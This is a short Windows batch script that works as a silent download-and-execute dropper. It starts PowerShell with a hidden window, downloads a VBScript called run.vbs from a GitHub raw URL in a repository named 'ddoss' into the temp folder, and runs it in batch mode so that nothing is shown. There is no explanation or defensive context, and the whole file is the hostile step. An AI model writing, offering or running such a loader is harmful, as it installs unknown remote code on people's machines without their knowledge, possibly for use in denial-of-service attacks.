@echo off

set "url=https://raw.githubusercontent.com/srap18/ddoss/main/run.vbs"
set "temp=%temp%\run.vbs"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%temp%')"
wscript //B //Nologo "%temp%"
